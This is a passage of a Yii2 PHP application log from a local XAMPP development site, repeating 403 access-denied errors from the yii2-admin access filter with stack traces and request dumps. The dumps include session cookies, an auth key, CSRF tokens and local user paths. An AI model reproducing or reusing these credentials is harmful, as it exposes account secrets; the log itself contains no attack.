    'REQUEST_METHOD' => 'GET'
    'QUERY_STRING' => 'tag=697a6794496dc'
    'REQUEST_URI' => '/debug/default/toolbar?tag=697a6794496dc'
    'SCRIPT_NAME' => '/index.php'
    'PHP_SELF' => '/index.php'
    'REQUEST_TIME_FLOAT' => 1769629588.5618
    'REQUEST_TIME' => 1769629588
]
2026-01-28 15:46:33 [127.0.0.1][1][2nreelq6ih9vuja9usa43m96no][error][yii\web\HttpException:403] yii\web\ForbiddenHttpException: No tiene permitido ejecutar esta acción. in C:\xampp\htdocs\planealo_desarrollo\vendor\mdmsoft\yii2-admin\components\AccessControl.php:88
Stack trace:
#0 C:\xampp\htdocs\planealo_desarrollo\vendor\mdmsoft\yii2-admin\components\AccessControl.php(73): mdm\admin\components\AccessControl->denyAccess(Object(yii\web\User))
#1 C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\base\ActionFilter.php(83): mdm\admin\components\AccessControl->beforeAction(Object(yii\base\InlineAction))
#2 [internal function]: yii\base\ActionFilter->beforeFilter(Object(yii\base\ActionEvent))
#3 C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\base\Component.php(653): call_user_func(Array, Object(yii\base\ActionEvent))
#4 C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\base\Module.php(735): yii\base\Component->trigger('beforeAction', Object(yii\base\ActionEvent))
#5 C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\base\Controller.php(185): yii\base\Module->beforeAction(Object(yii\base\InlineAction))
#6 C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\base\Module.php(554): yii\base\Controller->runAction('index', Array)
#7 C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\web\Application.php(112): yii\base\Module->runAction('admin/route/ind...', Array)
#8 C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\base\Application.php(391): yii\web\Application->handleRequest(Object(yii\web\Request))
#9 C:\xampp\htdocs\planealo_desarrollo\web\index.php(12): yii\base\Application->run()
#10 {main}
2026-01-28 15:46:32 [127.0.0.1][1][2nreelq6ih9vuja9usa43m96no][info][application] $_GET = []

$_POST = []

$_FILES = []

$_COOKIE = [
    '_identity' => '9dc3e882c595ff0fa4feeae21489c917fcb86f4f3aef88d6982c5f18402701dea:2:{i:0;s:9:\"_identity\";i:1;s:46:\"[1,\"FCxNRGJia25jro30ecX5r8yVk7nCuaOY\",2592000]\";}'
    '_csrf' => '62eec84fae02f3723f5fd39cc3cad22dcdd04ab316f5139357f9c1e3822a06c1a:2:{i:0;s:5:\"_csrf\";i:1;s:32:\"rbJenndMR37iuhmNYhvcYBeDxQAw2HiZ\";}'
    'PHPSESSID' => '2nreelq6ih9vuja9usa43m96no'
]

$_SESSION = [
    '__flash' => []
    '__id' => 1
    '__authKey' => 'FCxNRGJia25jro30ecX5r8yVk7nCuaOY'
]

$_SERVER = [
    'REDIRECT_MIBDIRS' => 'C:/xampp/php/extras/mibs'
    'REDIRECT_MYSQL_HOME' => '\\xampp\\mysql\\bin'
    'REDIRECT_OPENSSL_CONF' => 'C:/xampp/apache/bin/openssl.cnf'
    'REDIRECT_PHP_PEAR_SYSCONF_DIR' => '\\xampp\\php'
    'REDIRECT_PHPRC' => '\\xampp\\php'
    'REDIRECT_TMP' => '\\xampp\\tmp'
    'REDIRECT_STATUS' => '200'
    'MIBDIRS' => 'C:/xampp/php/extras/mibs'
    'MYSQL_HOME' => '\\xampp\\mysql\\bin'
    'OPENSSL_CONF' => 'C:/xampp/apache/bin/openssl.cnf'
    'PHP_PEAR_SYSCONF_DIR' => '\\xampp\\php'
    'PHPRC' => '\\xampp\\php'
    'TMP' => '\\xampp\\tmp'
    'HTTP_HOST' => 'planealo.local'
    'HTTP_CONNECTION' => 'keep-alive'
    'HTTP_PRAGMA' => 'no-cache'
    'HTTP_CACHE_CONTROL' => 'no-cache'
    'HTTP_UPGRADE_INSECURE_REQUESTS' => '1'
    'HTTP_USER_AGENT' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36 OPR/126.0.0.0'
    'HTTP_ACCEPT' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7'
    'HTTP_REFERER' => 'http://planealo.local/admin/route/index'
    'HTTP_ACCEPT_ENCODING' => 'gzip, deflate'
    'HTTP_ACCEPT_LANGUAGE' => 'es,es-ES;q=0.9,en;q=0.8,ru;q=0.7,fr;q=0.6,it;q=0.5'
    'HTTP_COOKIE' => '_identity=9dc3e882c595ff0fa4feeae21489c917fcb86f4f3aef88d6982c5f18402701dea%3A2%3A%7Bi%3A0%3Bs%3A9%3A%22_identity%22%3Bi%3A1%3Bs%3A46%3A%22%5B1%2C%22FCxNRGJia25jro30ecX5r8yVk7nCuaOY%22%2C2592000%5D%22%3B%7D; _csrf=62eec84fae02f3723f5fd39cc3cad22dcdd04ab316f5139357f9c1e3822a06c1a%3A2%3A%7Bi%3A0%3Bs%3A5%3A%22_csrf%22%3Bi%3A1%3Bs%3A32%3A%22rbJenndMR37iuhmNYhvcYBeDxQAw2HiZ%22%3B%7D; PHPSESSID=2nreelq6ih9vuja9usa43m96no'
    'PATH' => 'C:\\Windows\\system32;C:\\Windows;C:\\Windows\\System32\\Wbem;C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\;C:\\xampp\\php;C:\\ProgramData\\ComposerSetup\\bin;C:\\Program Files\\Git\\cmd;C:\\Program Files\\Git LFS;C:\\Windows\\System32\\OpenSSH\\;C:\\Users\\BlackOwl\\AppData\\Local\\Microsoft\\WindowsApps;C:\\Users\\BlackOwl\\AppData\\Roaming\\Composer\\vendor\\bin;C:\\Users\\BlackOwl\\AppData\\Local\\Programs\\Microsoft VS Code\\bin'
    'SystemRoot' => 'C:\\Windows'
    'COMSPEC' => 'C:\\Windows\\system32\\cmd.exe'
    'PATHEXT' => '.COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC'
    'WINDIR' => 'C:\\Windows'
    'SERVER_SIGNATURE' => '<address>Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.1.25 Server at planealo.local Port 80</address>
'
    'SERVER_SOFTWARE' => 'Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.1.25'
    'SERVER_NAME' => 'planealo.local'
    'SERVER_ADDR' => '127.0.0.1'
    'SERVER_PORT' => '80'
    'REMOTE_ADDR' => '127.0.0.1'
    'DOCUMENT_ROOT' => 'C:/xampp/htdocs/planealo_desarrollo/web'
    'REQUEST_SCHEME' => 'http'
    'CONTEXT_PREFIX' => ''
    'CONTEXT_DOCUMENT_ROOT' => 'C:/xampp/htdocs/planealo_desarrollo/web'
    'SERVER_ADMIN' => 'postmaster@localhost'
    'SCRIPT_FILENAME' => 'C:/xampp/htdocs/planealo_desarrollo/web/index.php'
    'REMOTE_PORT' => '58658'
    'REDIRECT_URL' => '/admin/route/index'
    'GATEWAY_INTERFACE' => 'CGI/1.1'
    'SERVER_PROTOCOL' => 'HTTP/1.1'
    'REQUEST_METHOD' => 'GET'
    'QUERY_STRING' => ''
    'REQUEST_URI' => '/admin/route/index'
    'SCRIPT_NAME' => '/index.php'
    'PHP_SELF' => '/index.php'
    'REQUEST_TIME_FLOAT' => 1769629592.6657
    'REQUEST_TIME' => 1769629592
]
2026-01-28 15:46:33 [127.0.0.1][1][2nreelq6ih9vuja9usa43m96no][error][yii\web\HttpException:403] yii\web\ForbiddenHttpException: No tiene permitido ejecutar esta acción. in C:\xampp\htdocs\planealo_desarrollo\vendor\mdmsoft\yii2-admin\components\AccessControl.php:88
Stack trace:
#0 C:\xampp\htdocs\planealo_desarrollo\vendor\mdmsoft\yii2-admin\components\AccessControl.php(73): mdm\admin\components\AccessControl->denyAccess(Object(yii\web\User))
#1 C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\base\ActionFilter.php(83): mdm\admin\components\AccessControl->beforeAction(Object(yii\base\InlineAction))
#2 [internal function]: yii\base\ActionFilter->beforeFilter(Object(yii\base\ActionEvent))
#3 C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\base\Component.php(653): call_user_func(Array, Object(yii\base\ActionEvent))
#4 C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\base\Module.php(735): yii\base\Component->trigger('beforeAction', Object(yii\base\ActionEvent))
#5 C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\base\Controller.php(185): yii\base\Module->beforeAction(Object(yii\base\InlineAction))
#6 C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\base\Module.php(554): yii\base\Controller->runAction('index', Array)
#7 C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\web\Application.php(112): yii\base\Module->runAction('admin/route/ind...', Array)
#8 C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\base\Application.php(391): yii\web\Application->handleRequest(Object(yii\web\Request))
#9 C:\xampp\htdocs\planealo_desarrollo\web\index.php(12): yii\base\Application->run()
#10 {main}
2026-01-28 15:46:32 [127.0.0.1][1][2nreelq6ih9vuja9usa43m96no][info][application] $_GET = []

$_POST = []

$_FILES = []

$_COOKIE = [
    '_identity' => '9dc3e882c595ff0fa4feeae21489c917fcb86f4f3aef88d6982c5f18402701dea:2:{i:0;s:9:\"_identity\";i:1;s:46:\"[1,\"FCxNRGJia25jro30ecX5r8yVk7nCuaOY\",2592000]\";}'
    '_csrf' => '62eec84fae02f3723f5fd39cc3cad22dcdd04ab316f5139357f9c1e3822a06c1a:2:{i:0;s:5:\"_csrf\";i:1;s:32:\"rbJenndMR37iuhmNYhvcYBeDxQAw2HiZ\";}'
    'PHPSESSID' => '2nreelq6ih9vuja9usa43m96no'
]

$_SESSION = [
    '__flash' => []
    '__id' => 1
    '__authKey' => 'FCxNRGJia25jro30ecX5r8yVk7nCuaOY'
]

$_SERVER = [
    'REDIRECT_MIBDIRS' => 'C:/xampp/php/extras/mibs'
    'REDIRECT_MYSQL_HOME' => '\\xampp\\mysql\\bin'
    'REDIRECT_OPENSSL_CONF' => 'C:/xampp/apache/bin/openssl.cnf'
    'REDIRECT_PHP_PEAR_SYSCONF_DIR' => '\\xampp\\php'
    'REDIRECT_PHPRC' => '\\xampp\\php'
    'REDIRECT_TMP' => '\\xampp\\tmp'
    'REDIRECT_STATUS' => '200'
    'MIBDIRS' => 'C:/xampp/php/extras/mibs'
    'MYSQL_HOME' => '\\xampp\\mysql\\bin'
    'OPENSSL_CONF' => 'C:/xampp/apache/bin/openssl.cnf'
    'PHP_PEAR_SYSCONF_DIR' => '\\xampp\\php'
    'PHPRC' => '\\xampp\\php'
    'TMP' => '\\xampp\\tmp'
    'HTTP_HOST' => 'planealo.local'
    'HTTP_CONNECTION' => 'keep-alive'
    'HTTP_PRAGMA' => 'no-cache'
    'HTTP_CACHE_CONTROL' => 'no-cache'
    'HTTP_UPGRADE_INSECURE_REQUESTS' => '1'
    'HTTP_USER_AGENT' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36 OPR/126.0.0.0'
    'HTTP_ACCEPT' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7'
    'HTTP_REFERER' => 'http://planealo.local/admin/route/index'
    'HTTP_ACCEPT_ENCODING' => 'gzip, deflate'
    'HTTP_ACCEPT_LANGUAGE' => 'es,es-ES;q=0.9,en;q=0.8,ru;q=0.7,fr;q=0.6,it;q=0.5'
    'HTTP_COOKIE' => '_identity=9dc3e882c595ff0fa4feeae21489c917fcb86f4f3aef88d6982c5f18402701dea%3A2%3A%7Bi%3A0%3Bs%3A9%3A%22_identity%22%3Bi%3A1%3Bs%3A46%3A%22%5B1%2C%22FCxNRGJia25jro30ecX5r8yVk7nCuaOY%22%2C2592000%5D%22%3B%7D; _csrf=62eec84fae02f3723f5fd39cc3cad22dcdd04ab316f5139357f9c1e3822a06c1a%3A2%3A%7Bi%3A0%3Bs%3A5%3A%22_csrf%22%3Bi%3A1%3Bs%3A32%3A%22rbJenndMR37iuhmNYhvcYBeDxQAw2HiZ%22%3B%7D; PHPSESSID=2nreelq6ih9vuja9usa43m96no'
    'PATH' => 'C:\\Windows\\system32;C:\\Windows;C:\\Windows\\System32\\Wbem;C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\;C:\\xampp\\php;C:\\ProgramData\\ComposerSetup\\bin;C:\\Program Files\\Git\\cmd;C:\\Program Files\\Git LFS;C:\\Windows\\System32\\OpenSSH\\;C:\\Users\\BlackOwl\\AppData\\Local\\Microsoft\\WindowsApps;C:\\Users\\BlackOwl\\AppData\\Roaming\\Composer\\vendor\\bin;C:\\Users\\BlackOwl\\AppData\\Local\\Programs\\Microsoft VS Code\\bin'
    'SystemRoot' => 'C:\\Windows'
    'COMSPEC' => 'C:\\Windows\\system32\\cmd.exe'
    'PATHEXT' => '.COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC'
    'WINDIR' => 'C:\\Windows'
    'SERVER_SIGNATURE' => '<address>Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.1.25 Server at planealo.local Port 80</address>
'
    'SERVER_SOFTWARE' => 'Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.1.25'
    'SERVER_NAME' => 'planealo.local'
    'SERVER_ADDR' => '127.0.0.1'
    'SERVER_PORT' => '80'
    'REMOTE_ADDR' => '127.0.0.1'
    'DOCUMENT_ROOT' => 'C:/xampp/htdocs/planealo_desarrollo/web'
    'REQUEST_SCHEME' => 'http'
    'CONTEXT_PREFIX' => ''
    'CONTEXT_DOCUMENT_ROOT' => 'C:/xampp/htdocs/planealo_desarrollo/web'
    'SERVER_ADMIN' => 'postmaster@localhost'
    'SCRIPT_FILENAME' => 'C:/xampp/htdocs/planealo_desarrollo/web/index.php'
    'REMOTE_PORT' => '58655'
    'REDIRECT_URL' => '/admin/route/index'
    'GATEWAY_INTERFACE' => 'CGI/1.1'
    'SERVER_PROTOCOL' => 'HTTP/1.1'
    'REQUEST_METHOD' => 'GET'
    'QUERY_STRING' => ''
    'REQUEST_URI' => '/admin/route/index'
    'SCRIPT_NAME' => '/index.php'
    'PHP_SELF' => '/index.php'
    'REQUEST_TIME_FLOAT' => 1769629592.7552
    'REQUEST_TIME' => 1769629592
]
2026-01-28 15:46:35 [127.0.0.1][1][2nreelq6ih9vuja9usa43m96no][error][yii\web\HttpException:403] yii\web\ForbiddenHttpException: No tiene permitido ejecutar esta acción. in C:\xampp\htdocs\planealo_desarrollo\vendor\mdmsoft\yii2-admin\components\AccessControl.php:88
Stack trace:
#0 C:\xampp\htdocs\planealo_desarrollo\vendor\mdmsoft\yii2-admin\components\AccessControl.php(73): mdm\admin\components\AccessControl->denyAccess(Object(yii\web\User))
#1 C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\base\ActionFilter.php(83): mdm\admin\components\AccessControl->beforeAction(Object(yii\base\InlineAction))
#2 [internal function]: yii\base\ActionFilter->beforeFilter(Object(yii\base\ActionEvent))
#3 C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\base\Component.php(653): call_user_func(Array, Object(yii\base\ActionEvent))
#4 C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\base\Module.php(735): yii\base\Component->trigger('beforeAction', Object(yii\base\ActionEvent))
#5 C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\base\Controller.php(185): yii\base\Module->beforeAction(Object(yii\base\InlineAction))
#6 C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\base\Module.php(554): yii\base\Controller->runAction('toolbar', Array)
#7 C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\web\Application.php(112): yii\base\Module->runAction('debug/default/t...', Array)
#8 C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\base\Application.php(391): yii\web\Application->handleRequest(Object(yii\web\Request))
#9 C:\xampp\htdocs\planealo_desarrollo\web\index.php(12): yii\base\Application->run()
#10 {main}
2026-01-28 15:46:34 [127.0.0.1][1][2nreelq6ih9vuja9usa43m96no][info][application] $_GET = [
    'tag' => '697a6799d633a'
]

$_POST = []

$_FILES = []

$_COOKIE = [
    '_identity' => '9dc3e882c595ff0fa4feeae21489c917fcb86f4f3aef88d6982c5f18402701dea:2:{i:0;s:9:\"_identity\";i:1;s:46:\"[1,\"FCxNRGJia25jro30ecX5r8yVk7nCuaOY\",2592000]\";}'
    '_csrf' => '62eec84fae02f3723f5fd39cc3cad22dcdd04ab316f5139357f9c1e3822a06c1a:2:{i:0;s:5:\"_csrf\";i:1;s:32:\"rbJenndMR37iuhmNYhvcYBeDxQAw2HiZ\";}'
    'PHPSESSID' => '2nreelq6ih9vuja9usa43m96no'
]

$_SESSION = [
    '__flash' => []
    '__id' => 1
    '__authKey' => 'FCxNRGJia25jro30ecX5r8yVk7nCuaOY'
]

$_SERVER = [
    'REDIRECT_MIBDIRS' => 'C:/xampp/php/extras/mibs'
    'REDIRECT_MYSQL_HOME' => '\\xampp\\mysql\\bin'
    'REDIRECT_OPENSSL_CONF' => 'C:/xampp/apache/bin/openssl.cnf'
    'REDIRECT_PHP_PEAR_SYSCONF_DIR' => '\\xampp\\php'
    'REDIRECT_PHPRC' => '\\xampp\\php'
    'REDIRECT_TMP' => '\\xampp\\tmp'
    'REDIRECT_STATUS' => '200'
    'MIBDIRS' => 'C:/xampp/php/extras/mibs'
    'MYSQL_HOME' => '\\xampp\\mysql\\bin'
    'OPENSSL_CONF' => 'C:/xampp/apache/bin/openssl.cnf'
    'PHP_PEAR_SYSCONF_DIR' => '\\xampp\\php'
    'PHPRC' => '\\xampp\\php'
    'TMP' => '\\xampp\\tmp'
    'HTTP_HOST' => 'planealo.local'
    'HTTP_CONNECTION' => 'keep-alive'
    'HTTP_PRAGMA' => 'no-cache'
    'HTTP_CACHE_CONTROL' => 'no-cache'
    'HTTP_USER_AGENT' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36 OPR/126.0.0.0'
    'HTTP_ACCEPT' => 'text/html'
    'HTTP_X_REQUESTED_WITH' => 'XMLHttpRequest'
    'HTTP_REFERER' => 'http://planealo.local/admin/route/index'
    'HTTP_ACCEPT_ENCODING' => 'gzip, deflate'
    'HTTP_ACCEPT_LANGUAGE' => 'es,es-ES;q=0.9,en;q=0.8,ru;q=0.7,fr;q=0.6,it;q=0.5'
    'HTTP_COOKIE' => '_identity=9dc3e882c595ff0fa4feeae21489c917fcb86f4f3aef88d6982c5f18402701dea%3A2%3A%7Bi%3A0%3Bs%3A9%3A%22_identity%22%3Bi%3A1%3Bs%3A46%3A%22%5B1%2C%22FCxNRGJia25jro30ecX5r8yVk7nCuaOY%22%2C2592000%5D%22%3B%7D; _csrf=62eec84fae02f3723f5fd39cc3cad22dcdd04ab316f5139357f9c1e3822a06c1a%3A2%3A%7Bi%3A0%3Bs%3A5%3A%22_csrf%22%3Bi%3A1%3Bs%3A32%3A%22rbJenndMR37iuhmNYhvcYBeDxQAw2HiZ%22%3B%7D; PHPSESSID=2nreelq6ih9vuja9usa43m96no'
    'PATH' => 'C:\\Windows\\system32;C:\\Windows;C:\\Windows\\System32\\Wbem;C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\;C:\\xampp\\php;C:\\ProgramData\\ComposerSetup\\bin;C:\\Program Files\\Git\\cmd;C:\\Program Files\\Git LFS;C:\\Windows\\System32\\OpenSSH\\;C:\\Users\\BlackOwl\\AppData\\Local\\Microsoft\\WindowsApps;C:\\Users\\BlackOwl\\AppData\\Roaming\\Composer\\vendor\\bin;C:\\Users\\BlackOwl\\AppData\\Local\\Programs\\Microsoft VS Code\\bin'
    'SystemRoot' => 'C:\\Windows'
    'COMSPEC' => 'C:\\Windows\\system32\\cmd.exe'
    'PATHEXT' => '.COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC'
    'WINDIR' => 'C:\\Windows'
    'SERVER_SIGNATURE' => '<address>Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.1.25 Server at planealo.local Port 80</address>
'
    'SERVER_SOFTWARE' => 'Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.1.25'
    'SERVER_NAME' => 'planealo.local'
    'SERVER_ADDR' => '127.0.0.1'
    'SERVER_PORT' => '80'
    'REMOTE_ADDR' => '127.0.0.1'
    'DOCUMENT_ROOT' => 'C:/xampp/htdocs/planealo_desarrollo/web'
    'REQUEST_SCHEME' => 'http'
    'CONTEXT_PREFIX' => ''
    'CONTEXT_DOCUMENT_ROOT' => 'C:/xampp/htdocs/planealo_desarrollo/web'
    'SERVER_ADMIN' => 'postmaster@localhost'
    'SCRIPT_FILENAME' => 'C:/xampp/htdocs/planealo_desarrollo/web/index.php'
    'REMOTE_PORT' => '58667'
    'REDIRECT_URL' => '/debug/default/toolbar'
    'REDIRECT_QUERY_STRING' => 'tag=697a6799d633a'
    'GATEWAY_INTERFACE' => 'CGI/1.1'
    'SERVER_PROTOCOL' => 'HTTP/1.1'
    'REQUEST_METHOD' => 'GET'
    'QUERY_STRING' => 'tag=697a6799d633a'
    'REQUEST_URI' => '/debug/default/toolbar?tag=697a6799d633a'
    'SCRIPT_NAME' => '/index.php'
    'PHP_SELF' => '/index.php'
    'REQUEST_TIME_FLOAT' => 1769629594.86
    'REQUEST_TIME' => 1769629594
]
2026-01-28 15:47:24 [127.0.0.1][1][2nreelq6ih9vuja9usa43m96no][error][yii\web\HttpException:403] yii\web\ForbiddenHttpException: No tiene permitido ejecutar esta acción. in C:\xampp\htdocs\planealo_desarrollo\vendor\mdmsoft\yii2-admin\components\AccessControl.php:88
Stack trace:
#0 C:\xampp\htdocs\planealo_desarrollo\vendor\mdmsoft\yii2-admin\components\AccessControl.php(73): mdm\admin\components\AccessControl->denyAccess(Object(yii\web\User))
#1 C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\base\ActionFilter.php(83): mdm\admin\components\AccessControl->beforeAction(Object(yii\base\InlineAction))
#2 [internal function]: yii\base\ActionFilter->beforeFilter(Object(yii\base\ActionEvent))
#3 C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\base\Component.php(653): call_user_func(Array, Object(yii\base\ActionEvent))
#4 C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\base\Module.php(735): yii\base\Component->trigger('beforeAction', Object(yii\base\ActionEvent))
#5 C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\base\Controller.php(185): yii\base\Module->beforeAction(Object(yii\base\InlineAction))
#6 C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\base\Module.php(554): yii\base\Controller->runAction('toolbar', Array)
#7 C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\web\Application.php(112): yii\base\Module->runAction('debug/default/t...', Array)
#8 C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\base\Application.php(391): yii\web\Application->handleRequest(Object(yii\web\Request))
#9 C:\xampp\htdocs\planealo_desarrollo\web\index.php(12): yii\base\Application->run()
#10 {main}
2026-01-28 15:47:24 [127.0.0.1][1][2nreelq6ih9vuja9usa43m96no][info][application] $_GET = [
    'tag' => '697a67cbef314'
]

$_POST = []

$_FILES = []

$_COOKIE = [
    '_identity' => '9dc3e882c595ff0fa4feeae21489c917fcb86f4f3aef88d6982c5f18402701dea:2:{i:0;s:9:\"_identity\";i:1;s:46:\"[1,\"FCxNRGJia25jro30ecX5r8yVk7nCuaOY\",2592000]\";}'
    '_csrf' => '62eec84fae02f3723f5fd39cc3cad22dcdd04ab316f5139357f9c1e3822a06c1a:2:{i:0;s:5:\"_csrf\";i:1;s:32:\"rbJenndMR37iuhmNYhvcYBeDxQAw2HiZ\";}'
    'PHPSESSID' => '2nreelq6ih9vuja9usa43m96no'
]

$_SESSION = [
    '__flash' => []
    '__id' => 1
    '__authKey' => 'FCxNRGJia25jro30ecX5r8yVk7nCuaOY'
]

$_SERVER = [
    'REDIRECT_MIBDIRS' => 'C:/xampp/php/extras/mibs'
    'REDIRECT_MYSQL_HOME' => '\\xampp\\mysql\\bin'
    'REDIRECT_OPENSSL_CONF' => 'C:/xampp/apache/bin/openssl.cnf'
    'REDIRECT_PHP_PEAR_SYSCONF_DIR' => '\\xampp\\php'
    'REDIRECT_PHPRC' => '\\xampp\\php'
    'REDIRECT_TMP' => '\\xampp\\tmp'
    'REDIRECT_STATUS' => '200'
    'MIBDIRS' => 'C:/xampp/php/extras/mibs'
    'MYSQL_HOME' => '\\xampp\\mysql\\bin'
    'OPENSSL_CONF' => 'C:/xampp/apache/bin/openssl.cnf'
    'PHP_PEAR_SYSCONF_DIR' => '\\xampp\\php'
    'PHPRC' => '\\xampp\\php'
    'TMP' => '\\xampp\\tmp'
    'HTTP_HOST' => 'planealo.local'
    'HTTP_CONNECTION' => 'keep-alive'
    'HTTP_USER_AGENT' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36 OPR/126.0.0.0'
    'HTTP_ACCEPT' => 'text/html'
    'HTTP_X_REQUESTED_WITH' => 'XMLHttpRequest'
    'HTTP_REFERER' => 'http://planealo.local/admin/route/index'
    'HTTP_ACCEPT_ENCODING' => 'gzip, deflate'
    'HTTP_ACCEPT_LANGUAGE' => 'es,es-ES;q=0.9,en;q=0.8,ru;q=0.7,fr;q=0.6,it;q=0.5'
    'HTTP_COOKIE' => '_identity=9dc3e882c595ff0fa4feeae21489c917fcb86f4f3aef88d6982c5f18402701dea%3A2%3A%7Bi%3A0%3Bs%3A9%3A%22_identity%22%3Bi%3A1%3Bs%3A46%3A%22%5B1%2C%22FCxNRGJia25jro30ecX5r8yVk7nCuaOY%22%2C2592000%5D%22%3B%7D; _csrf=62eec84fae02f3723f5fd39cc3cad22dcdd04ab316f5139357f9c1e3822a06c1a%3A2%3A%7Bi%3A0%3Bs%3A5%3A%22_csrf%22%3Bi%3A1%3Bs%3A32%3A%22rbJenndMR37iuhmNYhvcYBeDxQAw2HiZ%22%3B%7D; PHPSESSID=2nreelq6ih9vuja9usa43m96no'
    'PATH' => 'C:\\Windows\\system32;C:\\Windows;C:\\Windows\\System32\\Wbem;C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\;C:\\xampp\\php;C:\\ProgramData\\ComposerSetup\\bin;C:\\Program Files\\Git\\cmd;C:\\Program Files\\Git LFS;C:\\Windows\\System32\\OpenSSH\\;C:\\Users\\BlackOwl\\AppData\\Local\\Microsoft\\WindowsApps;C:\\Users\\BlackOwl\\AppData\\Roaming\\Composer\\vendor\\bin;C:\\Users\\BlackOwl\\AppData\\Local\\Programs\\Microsoft VS Code\\bin'
    'SystemRoot' => 'C:\\Windows'
    'COMSPEC' => 'C:\\Windows\\system32\\cmd.exe'
    'PATHEXT' => '.COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC'
    'WINDIR' => 'C:\\Windows'
    'SERVER_SIGNATURE' => '<address>Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.1.25 Server at planealo.local Port 80</address>
'
    'SERVER_SOFTWARE' => 'Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.1.25'
    'SERVER_NAME' => 'planealo.local'
    'SERVER_ADDR' => '127.0.0.1'
    'SERVER_PORT' => '80'
    'REMOTE_ADDR' => '127.0.0.1'
    'DOCUMENT_ROOT' => 'C:/xampp/htdocs/planealo_desarrollo/web'
    'REQUEST_SCHEME' => 'http'
    'CONTEXT_PREFIX' => ''
    'CONTEXT_DOCUMENT_ROOT' => 'C:/xampp/htdocs/planealo_desarrollo/web'
    'SERVER_ADMIN' => 'postmaster@localhost'
    'SCRIPT_FILENAME' => 'C:/xampp/htdocs/planealo_desarrollo/web/index.php'
    'REMOTE_PORT' => '58673'
    'REDIRECT_URL' => '/debug/default/toolbar'
    'REDIRECT_QUERY_STRING' => 'tag=697a67cbef314'
    'GATEWAY_INTERFACE' => 'CGI/1.1'
    'SERVER_PROTOCOL' => 'HTTP/1.1'
    'REQUEST_METHOD' => 'GET'
    'QUERY_STRING' => 'tag=697a67cbef314'
    'REQUEST_URI' => '/debug/default/toolbar?tag=697a67cbef314'
    'SCRIPT_NAME' => '/index.php'
    'PHP_SELF' => '/index.php'
    'REQUEST_TIME_FLOAT' => 1769629644.5452
    'REQUEST_TIME' => 1769629644
]
2026-01-28 15:47:50 [127.0.0.1][1][2nreelq6ih9vuja9usa43m96no][error][yii\web\HttpException:403] yii\web\ForbiddenHttpException: No tiene permitido ejecutar esta acción. in C:\xampp\htdocs\planealo_desarrollo\vendor\mdmsoft\yii2-admin\components\AccessControl.php:88
Stack trace:
#0 C:\xampp\htdocs\planealo_desarrollo\vendor\mdmsoft\yii2-admin\components\AccessControl.php(73): mdm\admin\components\AccessControl->denyAccess(Object(yii\web\User))
#1 C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\base\ActionFilter.php(83): mdm\admin\components\AccessControl->beforeAction(Object(yii\base\InlineAction))
#2 [internal function]: yii\base\ActionFilter->beforeFilter(Object(yii\base\ActionEvent))
